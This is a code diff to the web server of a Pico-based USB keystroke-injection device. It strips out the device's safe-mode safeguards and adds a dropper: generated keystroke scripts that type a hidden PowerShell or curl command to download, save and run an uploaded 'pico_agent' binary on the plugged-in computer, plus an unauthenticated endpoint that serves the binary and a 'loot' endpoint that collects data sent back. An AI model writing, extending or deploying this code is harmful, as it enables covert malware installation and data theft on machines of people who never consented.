@@ -3,12 +3,10 @@ import binascii
 import gc
 import json
 import os
-import time
 
 import network
 
 from device_config import (
-    ALLOW_UNSAFE,
     AP_PASSWORD,
     AP_SSID,
     CORS_ALLOW_CREDENTIALS,
@@ -45,138 +43,36 @@ from keyboard_layouts import (
 from status_led import STATUS_LED
 from web_assets import INDEX_HTML, LOGIN_HTML, PORTAL_CSS, PORTAL_JS
 
-PORT: int = 80
-_USB_ENUM_TIMEOUT_MS = 5000
-_DEFAULT_AP_IP = '192.168.4.1'
-_KEYBOARD_LAYOUT_FILE = 'keyboard_layout.txt'
-_RUN_HISTORY_LIMIT = 12
-_SESSION_COOKIE = 'pico_bit_session'
-_SESSION_TIMEOUT_MS = 30 * 60 * 1000
-_MAX_LOGIN_ATTEMPTS = 5
-_LOGIN_LOCKOUT_MS = 60_000
-_AP_CHECK_INTERVAL_MS = 6_000
-_WDT_TIMEOUT_MS = 8_000
-_PAYLOADS_DIR = 'payloads'
-_PAYLOAD_NAME_MAX = 32
-_JSON_HEADERS = {'Content-Type': 'application/json; charset=utf-8'}
-_NO_STORE = {'Cache-Control': 'no-store'}
-_STATIC_CACHE = {'Cache-Control': 'public, max-age=86400'}
+from ._http import (
+    _AP_CHECK_INTERVAL_MS,
+    _DEFAULT_AP_IP,
+    _FILE_CHUNK_SIZE,
+    _JSON_HEADERS,
+    _KEYBOARD_LAYOUT_FILE,
+    _LOGIN_LOCKOUT_MS,
+    _LOOT_FILE,
+    _MAX_BINARY_SIZE,
+    _MAX_LOGIN_ATTEMPTS,
+    _NO_STORE,
+    _PAYLOAD_BIN,
+    _RUN_HISTORY_LIMIT,
+    _SESSION_COOKIE,
+    _SESSION_TIMEOUT_MS,
+    _STATIC_CACHE,
+    _STATIC_DIR,
+    _USB_ENUM_TIMEOUT_MS,
+    _WDT_TIMEOUT_MS,
+    PORT,
+    _esc,
+    _merge_headers,
+    _parse_form,
+    _read_request_headers,
+    _ticks_add,
+    _ticks_diff,
+    _ticks_ms,
+)
 
 __all__ = ['SetupServer', 'SERVER', 'start']
-
-
-def _esc(s: str) -> str:
-    return s.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
-
-
-def _urldecode(s: str) -> str:
-    out: list[str] = []
-    i = 0
-    while i < len(s):
-        if s[i] == '%' and i + 2 < len(s):
-            out.append(chr(int(s[i + 1 : i + 3], 16)))
-            i += 3
-        elif s[i] == '+':
-            out.append(' ')
-            i += 1
-        else:
-            out.append(s[i])
-            i += 1
-    return ''.join(out)
-
-
-def _parse_form(body: bytes) -> dict[str, str]:
-    params: dict[str, str] = {}
-    for pair in body.decode('utf-8', 'ignore').split('&'):
-        if '=' not in pair:
-            continue
-        key, value = pair.split('=', 1)
-        params[_urldecode(key)] = _urldecode(value)
-    return params
-
-
-def _parse_cookies(header_value: str) -> dict[str, str]:
-    cookies: dict[str, str] = {}
-    for item in header_value.split(';'):
-        if '=' not in item:
-            continue
-        key, value = item.split('=', 1)
-        cookies[key.strip()] = value.strip()
-    return cookies
-
-
-def _merge_headers(*items) -> dict[str, str]:
-    merged: dict[str, str] = {}
-    for item in items:
-        if not item:
-            continue
-        for key, value in item.items():
-            merged[key] = value
-    return merged
-
-
-def _ticks_ms() -> int:
-    ticks_ms = getattr(time, 'ticks_ms', None)
-    if callable(ticks_ms):
-        return int(ticks_ms())  # type: ignore
-    return int(time.monotonic() * 1000)
-
-
-def _ticks_add(t: int, delta: int) -> int:
-    fn = getattr(time, 'ticks_add', None)
-    if callable(fn):
-        return int(fn(t, delta))  # type: ignore
-    return t + delta
-
-
-def _ticks_diff(end: int, start: int) -> int:
-    fn = getattr(time, 'ticks_diff', None)
-    if callable(fn):
-        return int(fn(end, start))  # type: ignore
-    return end - start
-
-
-def _validate_payload_name(name: str) -> bool:
-    if not name or len(name) > _PAYLOAD_NAME_MAX:
-        return False
-    return all(c.isalnum() or c in '-_' for c in name)
-
-
-async def _read_request(reader):
-    request_line = await reader.readline()
-    if not request_line:
-        return None
-
-    parts = request_line.decode('utf-8', 'ignore').strip().split()
-    if len(parts) < 2:
-        raise ValueError('malformed request line')
-
-    headers: dict[str, str] = {}
-    while True:
-        line = await reader.readline()
-        if not line or line in (b'\r\n', b'\n'):
-            break
-        header = line.decode('utf-8', 'ignore').strip()
-        if ':' not in header:
-            continue
-        key, value = header.split(':', 1)
-        headers[key.lower()] = value.strip()
-
-    content_length = int(headers.get('content-length', '0') or 0)
-    body = b''
-    if content_length:
-        body = await reader.readexactly(content_length)
-
-    target = parts[1]
-    path = target.split('?', 1)[0]
-    return {
-        'method': parts[0].upper(),
-        'path': path,
-        'target': target,
-        'headers': headers,
-        'body': body,
-        'cookies': _parse_cookies(headers.get('cookie', '')),
-    }
 
 
 class SetupServer:
@@ -184,7 +80,6 @@ class SetupServer:
         self.port = port
         self._ap = None
         self._ap_ip = _DEFAULT_AP_IP
-        self._allow_unsafe = bool(ALLOW_UNSAFE)
         self._kbd = None
         self._ap_password_in_use = AP_PASSWORD
         self._keyboard_layout = DEFAULT_LAYOUT_CODE
@@ -221,50 +116,171 @@ class SetupServer:
         self._payload_seeded = False
         return payload_path
 
-    def _ensure_payloads_dir(self) -> None:
+    def _ensure_static_dir(self) -> None:
         try:
-            os.mkdir(_PAYLOADS_DIR)
+            os.mkdir(_STATIC_DIR)
         except OSError as exc:
             if exc.args[0] != 17:  # EEXIST
                 raise
 
-    def _list_payloads(self) -> list[dict[str, object]]:
+    def _has_binary(self) -> bool:
+        try:
+            os.stat(_PAYLOAD_BIN)
+            return True
+        except OSError:
+            return False
+
+    def _stager_script(self, target_os: str) -> str:
+        url = 'http://' + self._ap_ip + '/static/payload.bin'
+        if target_os == 'windows':
+            cmd = (
+                'powershell -w hidden -c "iwr '
+                + url
+                + ' -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"'
+            )
+            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
+        curl_cmd = (
+            'curl -s '
+            + url
+            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &'
+        )
+        if target_os == 'macos':
+            return (
+                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
+                'DELAY 600\nSTRING ' + curl_cmd + '\nENTER'
+            )
+        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + curl_cmd + '\nENTER'
+
+    async def _send_headers(self, writer, request, status: str, headers=None) -> None:
+        gc.collect()
+        response_headers = _merge_headers(
+            {'Connection': 'close', 'X-Content-Type-Options': 'nosniff'},
+            headers,
+            self._cors_headers(request),
+        )
+        header_lines = [f'HTTP/1.1 {status}']
+        for key, value in response_headers.items():
+            header_lines.append(f'{key}: {value}')
+        header_lines.append('')
+        header_lines.append('')
+        writer.write('\r\n'.join(header_lines).encode())
+        await writer.drain()
+
+    async def _handle_binary_upload_stream(
+        self, reader, writer, partial, content_length: int
+    ) -> None:
+        if not self._is_authorized(partial):
+            await self._send_json(
+                writer, partial, '401 Unauthorized', {'message': 'Sign in required.'}
+            )
+            return
+
+        if not content_length:
+            await self._send_json(
+                writer, partial, '400 Bad Request', {'message': 'No content received.'}
+            )
+            return
+
+        if content_length > _MAX_BINARY_SIZE:
+            remaining = content_length
+            while remaining > 0:
+                chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
+                if not chunk:
+                    break
+                remaining -= len(chunk)
+            await self._send_json(
+                writer,
+                partial,
+                '413 Content Too Large',
+                {
+                    'message': (f'Binary too large (max {_MAX_BINARY_SIZE // (1024 * 1024)} MB).'),
+                    'notice': 'error',
+                },
+            )
+            return
+
+        written = 0
+        try:
+            self._ensure_static_dir()
+            gc.collect()
+            with open(_PAYLOAD_BIN, 'wb') as f:
+                remaining = content_length
+                while remaining > 0:
+                    chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                    written += len(chunk)
+                    remaining -= len(chunk)
+        except (OSError, MemoryError):
+            await self._send_json(
+                writer,
+                partial,
+                '500 Internal Server Error',
+                {'message': 'Write failed. Check available flash space.', 'notice': 'error'},
+            )
+            return
+
+        fname = partial['headers'].get('x-filename', 'payload.bin')
+        await self._send_json(
+            writer,
+            partial,
+            '200 OK',
+            {
+                'message': f'Binary uploaded ({written} bytes).',
+                'notice': 'success',
+                'size': written,
+                'filename': fname,
+            },
+        )
+
+    async def _handle_loot_receive(self, request, writer) -> None:
         gc.collect()
         try:
-            entries = os.listdir(_PAYLOADS_DIR)
+            data = json.loads(request['body'].decode('utf-8', 'ignore') or '{}')
+        except ValueError:
+            await self._send_json(writer, request, '400 Bad Request', {'message': 'Invalid JSON.'})
+            return
+        try:
+            gc.collect()
+            with open(_LOOT_FILE, 'w') as f:
+                f.write(json.dumps(data))
+        except (OSError, MemoryError):
+            await self._send_json(
+                writer, request, '500 Internal Server Error', {'message': 'Write failed.'}
+            )
+            return
+        await self._send_json(writer, request, '200 OK', {'message': 'Loot saved.'})
+
+    async def _serve_payload(self, writer, request) -> None:
+        try:
+            fstat = os.stat(_PAYLOAD_BIN)
+            file_size = fstat[6]
         except OSError:
-            return []
-        result: list[dict[str, object]] = []
-        for entry in entries:
-            if not entry.endswith('.dd'):
-                continue
-            name = entry[:-3]
-            try:
-                size = os.stat(f'{_PAYLOADS_DIR}/{entry}')[6]
-            except OSError:
-                size = 0
-            result.append({'name': name, 'size': size})
-        return result
-
-    def _read_named_payload(self, name: str) -> str:
-        gc.collect()
-        with open(f'{_PAYLOADS_DIR}/{name}.dd') as f:
-            return f.read()
-
-    def _write_named_payload(self, name: str, content: str) -> None:
-        self._ensure_payloads_dir()
-        gc.collect()
-        with open(f'{_PAYLOADS_DIR}/{name}.dd', 'w') as f:
-            f.write(content)
-
-    def _delete_named_payload(self, name: str) -> None:
-        os.remove(f'{_PAYLOADS_DIR}/{name}.dd')
-
-    def _safe_mode_enabled(self) -> bool:
-        return not self._allow_unsafe
-
-    def _set_safe_mode(self, enabled: bool) -> None:
-        self._allow_unsafe = not enabled
+            await self._send_json(
+                writer, request, '404 Not Found', {'message': 'No payload staged.'}
+            )
+            return
+        await self._send_headers(
+            writer,
+            request,
+            '200 OK',
+            headers={
+                'Content-Type': 'application/octet-stream',
+                'Content-Disposition': 'attachment; filename="payload.bin"',
+                'Content-Length': str(file_size),
+            },
+        )
+        try:
+            with open(_PAYLOAD_BIN, 'rb') as fh:
+                while True:
+                    chunk = fh.read(_FILE_CHUNK_SIZE)
+                    if not chunk:
+                        break
+                    writer.write(chunk)
+                    await writer.drain()
+        except OSError:
+            pass
 
     def _load_keyboard_layout(self) -> str:
         try:
@@ -313,21 +329,8 @@ class SetupServer:
             'keyboard_target_label': target_label,
         }
 
-    def _mode_strings(self) -> tuple[str, str, str]:
-        if self._allow_unsafe:
-            return (
-                'Unsafe mode allowed',
-                'Unsafe runtime enabled',
-                'Unsafe runtime features are allowed, so advanced commands may execute.',
-            )
-        return (
-            'Safe mode',
-            'Unsafe runtime blocked',
-            'Safe mode is active, so higher-risk runtime features stay blocked.',
-        )
-
     def _validation_state(self, script: str) -> AnalysisResult:
-        return analyze_script(script, allow_unsafe=self._allow_unsafe)
+        return analyze_script(script)
 
     def _history_preview(self, script: str) -> str:
         for raw_line in script.replace('\r\n', '\n').replace('\r', '\n').split('\n'):
@@ -345,16 +348,13 @@ class SetupServer:
 
     def _record_run(self, script: str, message: str, notice: str, *, source: str) -> None:
         self._run_sequence += 1
-        mode_label, _mode_short, _mode_description = self._mode_strings()
         self._run_history.insert(
             0,
             {
                 'at_ms': _ticks_ms(),
                 'message': message,
-                'mode_label': mode_label,
                 'notice': notice,
                 'preview': self._history_preview(script),
-                'safe_mode_enabled': self._safe_mode_enabled(),
                 'sequence': self._run_sequence,
                 'source': source,
             },
@@ -381,7 +381,6 @@ class SetupServer:
         return self._kbd is not None and self._kbd.is_open()
 
     def _bootstrap_state(self) -> dict[str, object]:
-        mode_label, mode_short, mode_description = self._mode_strings()
         message = ''
         notice = 'quiet'
         if self._payload_seeded:
@@ -395,15 +394,11 @@ class SetupServer:
             'auth_enabled': self._auth_enabled(),
             'keyboard_ready': self._keyboard_ready(),
             'message': message,
-            'mode_description': mode_description,
-            'mode_label': mode_label,
-            'mode_short': mode_short,
             'notice': notice,
-            'allow_unsafe': self._allow_unsafe,
             'payload': payload,
             'run_history': self._recent_runs(),
-            'safe_mode_enabled': self._safe_mode_enabled(),
             'seeded': self._payload_seeded,
+            'has_binary': self._has_binary(),
         }
         state.update(self._keyboard_layout_state())
         return state
@@ -560,19 +555,12 @@ class SetupServer:
             raise OSError('USB HID did not enumerate within 5 s')
         return keyboard
 
-    async def execute_script(self, script: str, allow_unsafe: bool | None = None) -> None:
-        if allow_unsafe is None:
-            allow_unsafe = self._allow_unsafe
+    async def execute_script(self, script: str) -> None:
         async with self._run_lock_obj():
             validate_script(script)
             keyboard = await self._ensure_keyboard()
             await STATUS_LED.show('payload_running')
-            await run_script(
-                keyboard,
-                script,
-                allow_unsafe=allow_unsafe,
-                default_layout=self._keyboard_layout,
-            )
+            await run_script(keyboard, script, default_layout=self._keyboard_layout)
 
     async def _prepare_server(self) -> None:
         if self._server is not None:
@@ -743,42 +731,6 @@ class SetupServer:
             )
             return
 
-        if request['method'] == 'POST' and request['path'] == '/api/safe-mode':
-            data = json.loads(request['body'].decode('utf-8', 'ignore') or '{}')
-            enabled = data.get('enabled')
-            if not isinstance(enabled, bool):
-                await self._send_json(
-                    writer,
-                    request,
-                    '400 Bad Request',
-                    {'message': 'safe mode enabled must be a boolean.', 'notice': 'error'},
-                )
-                return
-
-            self._set_safe_mode(enabled)
-            await STATUS_LED.show('safe_mode_changed')
-            mode_label, mode_short, mode_description = self._mode_strings()
-            payload = data.get('payload')
-            validation = None
-            if isinstance(payload, str):
-                validation = self._validation_state(payload.replace('\r\n', '\n'))
-            await self._send_json(
-                writer,
-                request,
-                '200 OK',
-                {
-                    'allow_unsafe': self._allow_unsafe,
-                    'message': 'Safe mode enabled.' if enabled else 'Safe mode disabled.',
-                    'mode_description': mode_description,
-                    'mode_label': mode_label,
-                    'mode_short': mode_short,
-                    'notice': 'success',
-                    'safe_mode_enabled': self._safe_mode_enabled(),
-                    'validation': validation,
-                },
-            )
-            return
-
         if request['method'] == 'POST' and request['path'] == '/api/keyboard-layout':
             data = json.loads(request['body'].decode('utf-8', 'ignore') or '{}')
             requested_os = data.get('os')
@@ -873,126 +825,66 @@ class SetupServer:
         path = request['path']
         method = request['method']
 
-        if path == '/api/payloads' and method == 'GET':
-            await self._send_json(writer, request, '200 OK', {'payloads': self._list_payloads()})
-            return
-
-        if path == '/api/payloads' and method == 'POST':
-            gc.collect()
+        if path == '/api/loot' and method == 'GET':
             try:
-                data = json.loads(request['body'].decode('utf-8', 'ignore') or '{}')
-            except ValueError:
-                await self._send_json(
-                    writer,
-                    request,
-                    '400 Bad Request',
-                    {'message': 'Invalid JSON body.', 'notice': 'error'},
-                )
-                return
-            name = str(data.get('name', '')).strip()
-            if not _validate_payload_name(name):
-                await self._send_json(
-                    writer,
-                    request,
-                    '400 Bad Request',
-                    {
-                        'message': 'Name must be 1-32 alphanumeric, hyphen, or underscore chars.',
-                        'notice': 'error',
-                    },
-                )
-                return
-            content = str(data.get('payload', '')).replace('\r\n', '\n')
-            try:
-                self._write_named_payload(name, content)
-            except OSError as exc:
-                errno_code = exc.args[0] if exc.args else 0
-                if errno_code == 28:  # ENOSPC
-                    msg = 'No space left on device.'
-                elif errno_code == 30:  # EROFS
-                    msg = 'Filesystem is read-only.'
-                elif errno_code == 2:  # ENOENT — payloads dir missing
-                    msg = 'Could not create payloads directory.'
-                else:
-                    msg = f'Write failed (errno {errno_code}).'
-                await self._send_json(
-                    writer,
-                    request,
-                    '500 Internal Server Error',
-                    {'message': msg, 'notice': 'error'},
-                )
-                return
-            except MemoryError:
-                await self._send_json(
-                    writer,
-                    request,
-                    '500 Internal Server Error',
-                    {
-                        'message': 'Not enough memory to save payload. Try a shorter payload.',
-                        'notice': 'error',
-                    },
-                )
-                return
-            except Exception:
-                await self._send_json(
-                    writer,
-                    request,
-                    '500 Internal Server Error',
-                    {'message': 'Save failed.', 'notice': 'error'},
-                )
-                return
-            await self._send_json(
-                writer,
-                request,
-                '200 OK',
-                {'message': f'Saved as {name}.dd', 'notice': 'success', 'name': name},
-            )
-            return
-
-        if path.startswith('/api/payloads/'):
-            rest = path[len('/api/payloads/') :]
-            if '/' in rest:
-                pname, action = rest.split('/', 1)
-            else:
-                pname, action = rest, ''
-
-            if not _validate_payload_name(pname):
-                await self._send_json(
-                    writer, request, '400 Bad Request', {'message': 'Invalid payload name.'}
-                )
-                return
-
-            if not action and method == 'GET':
-                gc.collect()
-                try:
-                    content = self._read_named_payload(pname)
-                except OSError:
-                    await self._send_json(
-                        writer, request, '404 Not Found', {'message': 'Payload not found.'}
-                    )
-                    return
-                await self._send_json(
-                    writer, request, '200 OK', {'name': pname, 'payload': content}
-                )
-                return
-
-            if not action and method == 'DELETE':
-                try:
-                    self._delete_named_payload(pname)
-                except OSError:
-                    await self._send_json(
-                        writer, request, '404 Not Found', {'message': 'Payload not found.'}
-                    )
-                    return
-                await self._send_json(
+                with open(_LOOT_FILE) as f:
+                    content = f.read()
+                await self._send(
                     writer,
                     request,
                     '200 OK',
-                    {'message': f'Deleted {pname}.dd', 'notice': 'success'},
+                    content.encode(),
+                    headers=_merge_headers(_JSON_HEADERS, _NO_STORE),
+                )
+            except OSError:
+                await self._send_json(
+                    writer, request, '404 Not Found', {'message': 'No loot collected yet.'}
+                )
+            return
+
+        if path == '/api/loot/download' and method == 'GET':
+            try:
+                with open(_LOOT_FILE) as f:
+                    content = f.read()
+                await self._send(
+                    writer,
+                    request,
+                    '200 OK',
+                    content.encode(),
+                    headers=_merge_headers(
+                        _JSON_HEADERS,
+                        {'Content-Disposition': 'attachment; filename="loot.json"'},
+                        _NO_STORE,
+                    ),
+                )
+            except OSError:
+                await self._send_json(
+                    writer, request, '404 Not Found', {'message': 'No loot collected yet.'}
+                )
+            return
+
+        if path == '/api/inject_binary' and method == 'POST':
+            if not self._has_binary():
+                await self._send_json(
+                    writer,
+                    request,
+                    '404 Not Found',
+                    {'message': 'No binary uploaded yet.', 'notice': 'error'},
                 )
                 return
-
+            try:
+                data = json.loads(request['body'].decode('utf-8', 'ignore') or '{}')
+            except ValueError:
+                data = {}
+            target_os = str(data.get('os', 'windows')).lower()
+            script = self._stager_script(target_os)
+            message, notice = await self._run_payload(script)
+            status = '200 OK' if notice == 'success' else '400 Bad Request'
             await self._send_json(
-                writer, request, '405 Method Not Allowed', {'message': 'Method not allowed.'}
+                writer,
+                request,
+                status,
+                {'message': message, 'notice': notice, 'run_history': self._recent_runs()},
             )
             return
 
@@ -1044,8 +936,16 @@ class SetupServer:
             )
             return
 
+        if request['method'] == 'POST' and request['path'] == '/api/loot':
+            await self._handle_loot_receive(request, writer)
+            return
+
         if request['path'].startswith('/api/'):
             await self._handle_api(request, writer)
+            return
+
+        if request['method'] == 'GET' and request['path'] == '/static/payload.bin':
+            await self._serve_payload(writer, request)
             return
 
         if not self._is_authorized(request):
@@ -1066,10 +966,18 @@ class SetupServer:
 
     async def _handle_request(self, reader, writer) -> None:
         try:
-            request = await _read_request(reader)
-            if request is None:
+            partial = await _read_request_headers(reader)
+            if partial is None:
                 return
-            await self._dispatch(request, writer)
+            content_length = int(partial['headers'].get('content-length', '0') or 0)
+            if partial['method'] == 'POST' and partial['path'] == '/api/upload_binary':
+                await self._handle_binary_upload_stream(reader, writer, partial, content_length)
+                return
+            body = b''
+            if content_length:
+                body = await reader.readexactly(content_length)
+            partial['body'] = body
+            await self._dispatch(partial, writer)
         except ValueError:
             fallback = {'method': 'GET', 'path': '/', 'headers': {}, 'body': b'', 'cookies': {}}
             try:
